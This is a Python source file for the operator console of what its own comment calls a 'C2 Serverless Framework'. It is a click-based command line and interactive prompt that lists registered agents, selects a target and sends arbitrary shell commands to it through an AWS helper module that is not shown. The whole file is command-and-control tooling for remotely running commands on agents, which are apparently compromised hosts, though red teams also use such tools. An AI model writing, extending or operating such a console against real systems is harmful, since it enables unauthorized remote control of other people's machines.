import click
import aws_commands
import formatter


def handle_list_agents():
    print("Searching for agents...")
    agents_list = aws_commands.list_agents()
    formatter.print_agents_table(agents_list)


def handle_send_task(agent_id, command):
    result_content = aws_commands.execute_task_wait_result(agent_id, command)
    formatter.print_task_result(result_content, agent_id)


@click.group()
def cli():
    # --- Command line interface for the C2 Serverless Framework ---
    pass


@cli.command()
def agents():
    handle_list_agents()


@cli.command()
@click.argument("agent_id")
@click.argument("command")
def task(agent_id, command):
    handle_send_task(agent_id, command)


if __name__ == "__main__":
    selected_agent = None

    while True:
        try:
            prompt = f"c2 ({selected_agent}) > " if selected_agent else "c2 > "
            user_input = input(prompt).strip()

            if not user_input:
                continue

            command_parts = user_input.split()
            main_command = command_parts[0].lower()

            if main_command in ["exit", "quit"]:
                print("Exiting...")
                break

            elif main_command == "agents":
                handle_list_agents()

            elif main_command == "select":
                if len(command_parts) != 2:
                    print("Error: Incorrect usage. Ex: select <agent_id>")
                else:
                    selected_agent = command_parts[1]
                    print(f"Agent '{selected_agent}' selected.")

            elif main_command == "unselect":
                selected_agent = None
                print("No agent selected.")

            elif main_command == "run":
                if not selected_agent:
                    print("Error: No agent selected.")
                    continue
                else:
                    while True:
                        command = input(f"c2 ({selected_agent}) > ").strip()

                        if not command:
                            continue

                        if command.lower() in ["back", "exit", "quit"]:
                            print("Returning to the main shell...")
                            break

                        handle_send_task(selected_agent, command)

            elif main_command == "help":
                print("\nAvailable commands:")
                print(" agents - Lists registered agents.")
                print(" select <id> - Selects a target agent.")
                print(" unselect - Unselects the current agent.")
                print(" run - Starts an interactive shell.")
                print(" help - Displays this help message.")
                print(" exit / quit - Closes the shell.\n")
                print("Commands within the interaction shell:")
                print(" <any_cmd> - Executes the command on the target.")
                print(" back / exit - Returns to the main shell.")

            else:
                print(f"Error: Unknown command '{main_command}'. Type 'help'.")

        except (KeyboardInterrupt, EOFError):
            print("\nExiting...")
            break
